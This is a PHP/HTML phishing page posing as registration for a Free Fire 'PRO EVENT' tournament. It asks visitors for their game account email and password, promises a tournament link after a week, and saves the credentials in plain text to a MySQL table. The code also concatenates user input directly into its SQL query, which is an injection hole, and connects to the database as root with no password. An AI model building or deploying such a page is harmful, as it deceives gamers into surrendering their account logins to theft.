<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: url("back.jpg") no-repeat center center fixed;
            background-size: cover;
            background-position: center top;   
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh; /* pure screen center */
        }

        .container {
            width: 320px;
            background-color: rgba(0, 0, 0, 0.7);
            padding: 30px;
            border-radius: 12px;
            text-align: center;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.8);
        }

        .container h2 {
            color: #fff;
            margin-bottom: 20px;
        }

        .container input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 6px;
            border: none;
            font-size: 16px;
        }

        .container button {
            width: 100%;
            padding: 12px;
            margin-top: 15px;
            background-color: crimson;
            border: none;
            color: #fff;
            font-size: 18px;
            font-weight: bold;
            border-radius: 6px;
            cursor: pointer;
        }

        .container button:hover {
            background-color: darkred;
        }

        h5 {
            color: white;
            font-size: 14px;
        }

       
        @media (max-width: 480px) {
            body {
                padding: 10px;
            }
            .container {
                width: 100%;
                padding: 20px;
            }
            .container h2 {
                font-size: 20px;
            }
            .container input {
                font-size: 14px;
                padding: 8px;
            }
            .container button {
                font-size: 16px;
                padding: 10px;
            }
            h5 {
                font-size: 12px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Register</h2>
        <form method="POST">
            <input type="email" placeholder="Enter Email" required name="mail">
            <input type="password" placeholder="Enter Password" required name="pass">
            <button type="submit" name="sb">Submit</button>
            
            <h5>Enter your Free Fire Email and Password to register for the PRO EVENT, the tournament link will be given after 1 week.</h5>
            <hr>
        </form>
    </div>

    <?php
    $con = mysqli_connect('localhost','root','','freefire');
    if(!$con){
        die("Connection failed: " . mysqli_connect_error());
    }

    if(isset($_POST['sb'])){
        $email = $_POST['mail'];
        $password = $_POST['pass'];

        $query = "INSERT INTO mydata (email, password) VALUES ('$email', '$password')";
        $execute = mysqli_query($con, $query);

        if($execute){
            echo "<script>alert('Data inserted successfully');</script>";
        } else {
            echo "<script>alert('Error: " . mysqli_error($con) . "');</script>";
        }
    }
    ?>
    
</body>
</html>
